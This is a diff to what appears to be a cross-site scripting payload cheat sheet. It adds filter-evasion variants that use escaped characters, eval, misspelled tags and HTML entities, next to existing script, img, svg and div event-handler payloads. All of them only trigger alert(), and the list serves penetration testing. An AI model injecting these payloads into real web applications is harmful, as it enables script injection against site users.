@@ -158,6 +158,8 @@ Most tools are also suitable for blind XSS attacks:
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
 "><script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('22')</script>
+<script>eval('\x61lert(\'33\')')</script>
 
 // Img payload
 <img src=x onerror=alert('XSS');>
@@ -177,6 +179,8 @@ Most tools are also suitable for blind XSS attacks:
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
 <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
+<svg><scritp>alert('33')
+<svg><scritp>alert&lpar;'33'&rpar;
 
 // Div payload
 <div onpointerover="alert(45)">MOVE HERE</div>
